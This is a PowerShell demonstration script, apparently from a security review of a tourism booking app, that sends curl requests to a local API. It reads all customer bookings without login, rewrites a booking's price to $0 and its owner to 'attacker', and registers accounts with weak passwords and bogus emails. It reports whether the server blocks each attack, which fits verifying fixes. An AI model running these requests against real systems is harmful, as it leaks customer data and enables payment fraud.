# V-13 attack demonstration - PowerShell version (no bash/WSL needed).
#
#   powershell -ExecutionPolicy Bypass -File scripts\attack.ps1
#
# Uses curl.exe (bundled with Windows 10/11) so HTTP status codes are reported
# exactly as the server sends them.

$API = "http://localhost:4000"
$RUN = [int](Get-Date -UFormat %s)

$tmp = [System.IO.Path]::GetTempFileName()

# PowerShell mangles inline JSON before curl.exe sees it, so the body always
# goes through a file (curl -d @file).
function Status($method, $url, $body) {
    if ($body) {
        [System.IO.File]::WriteAllText($tmp, $body)
        return (curl.exe -s -o NUL -w "%{http_code}" -X $method $url -H "Content-Type: application/json" -d "@$tmp")
    }
    return (curl.exe -s -o NUL -w "%{http_code}" -X $method $url)
}
function Body($method, $url, $body) {
    if ($body) {
        [System.IO.File]::WriteAllText($tmp, $body)
        return (curl.exe -s -X $method $url -H "Content-Type: application/json" -d "@$tmp")
    }
    return (curl.exe -s $url)
}
function Show($code, $successMeans) {
    # 2xx means the attack got through; 400/401 means the server stopped it.
    if ($code -match '^2') {
        Write-Host ">>> HTTP status: $code   <-- $successMeans" -ForegroundColor Red
    } else {
        Write-Host ">>> HTTP status: $code   <-- BLOCKED BY SERVER" -ForegroundColor Green
    }
}

# Seed one realistic booking so attack 1 has something to expose.
$seed = '{"name":"Nimal Perera","booking_type":"hotel","booking_date":"2026-03-01","booking_time":"09:00","start_date":"2026-03-05","end_date":"2026-03-09","mobile_number":771112223,"payID":"p0","tourID":"t0","payment_amount":420,"touristID":"real-customer","B_Id":"b1"}'
Status "POST" "$API/api/Booking" $seed | Out-Null

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 1 - Read every customer booking with no login    #"
Write-Host "############################################################"
Write-Host ""
Write-Host "`$ curl $API/api/Booking"
Write-Host ""
$out = Body "GET" "$API/api/Booking" $null
if ($out.Length -gt 550) { $out = $out.Substring(0,550) + "..." }
Write-Host $out
Write-Host ""
Show (Status "GET" "$API/api/Booking" $null) "CUSTOMER DATA LEAKED, NO LOGIN"

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 2 - Change a `$349 booking to `$0                  #"
Write-Host "############################################################"
Write-Host ""
Write-Host "--- Step 1: create a normal booking (price 349) ---"

$mk = '{"name":"Sigiriya Tour","booking_type":"hotel","booking_date":"2026-02-01","booking_time":"10:00","start_date":"2026-02-10","end_date":"2026-02-15","mobile_number":771234567,"payID":"p1","tourID":"t1","payment_amount":349,"touristID":"real-customer","B_Id":"b1"}'
$made = Body "POST" "$API/api/Booking" $mk
$id = $null
if ($made -match '"bookingID":"([^"]+)"') { $id = $matches[1] }

if (-not $id) {
    Write-Host "    (could not create a booking - the endpoint now requires a login)" -ForegroundColor Green
    Write-Host ""
    Write-Host "--- Step 2: THE ATTACK ---"
    Write-Host ""
    Write-Host "`$ curl -X PUT $API/api/Booking/<id> -d '{""payment_amount"":0}'"
    Write-Host ""
    Show (Status "PUT" "$API/api/Booking/any-id" '{"payment_amount":0}') "PRICE CHANGED"
} else {
    $before = Body "GET" "$API/api/Booking/$id" $null
    $bAmt = if ($before -match '"payment_amount":(\d+)') { $matches[1] } else { "?" }
    $bWho = if ($before -match '"touristID":"([^"]+)"') { $matches[1] } else { "?" }
    Write-Host "    bookingID      = $id"
    Write-Host "    payment_amount = $bAmt"
    Write-Host "    touristID      = $bWho"
    Write-Host ""
    Write-Host "--- Step 2: THE ATTACK ---"
    Write-Host ""
    Write-Host "`$ curl -X PUT $API/api/Booking/$id \"
    Write-Host "    -d '{""payment_amount"":0,""touristID"":""attacker""}'"
    Write-Host ""
    $code2 = Status "PUT" "$API/api/Booking/$id" '{"payment_amount":0,"touristID":"attacker"}'
    Write-Host "    server replied: HTTP $code2"
    Write-Host ""
    Write-Host "--- Step 3: what the database says now ---"
    $after = Body "GET" "$API/api/Booking/$id" $null
    $aAmt = if ($after -match '"payment_amount":(\d+)') { $matches[1] } else { "?" }
    $aWho = if ($after -match '"touristID":"([^"]+)"') { $matches[1] } else { "?" }
    $c1 = if ($aAmt -eq "0") { "Red" } else { "Green" }
    $c2 = if ($aWho -eq "attacker") { "Red" } else { "Green" }
    Write-Host "    payment_amount = $aAmt   <-- was 349" -ForegroundColor $c1
    Write-Host "    touristID      = $aWho   <-- was real-customer" -ForegroundColor $c2
}

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 3 - Register with a 1-character password         #"
Write-Host "############################################################"
Write-Host ""
Write-Host "(the React form requires 8+ characters)"
Write-Host ""
Write-Host "`$ curl -X POST $API/api/touristregister -d '{... ""password"":""1"" ...}'"
Write-Host ""
$b3 = "{""fullname"":""Weak Password"",""email"":""weak-demo-$RUN@test.com"",""password"":""1"",""country"":""LK"",""mobile_number"":""0771234567""}"
$o3 = Body "POST" "$API/api/touristregister" $b3
if ($o3.Length -gt 320) { $o3 = $o3.Substring(0,320) + "..." }
Write-Host $o3
Write-Host ""
Show (Status "POST" "$API/api/touristregister" ($b3 -replace $RUN, ($RUN+1))) "ACCOUNT CREATED"

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 4 - Register with an invalid email               #"
Write-Host "############################################################"
Write-Host ""
Write-Host "`$ curl -X POST $API/api/touristregister -d '{... ""email"":""this-is-not-an-email"" ...}'"
Write-Host ""
$b4 = "{""fullname"":""Bad Email"",""email"":""this-is-not-an-email-$RUN"",""password"":""password123"",""country"":""LK"",""mobile_number"":""0771234567""}"
Show (Status "POST" "$API/api/touristregister" $b4) "ACCOUNT CREATED WITH BOGUS EMAIL"
Write-Host ""

Remove-Item $tmp -ErrorAction SilentlyContinue
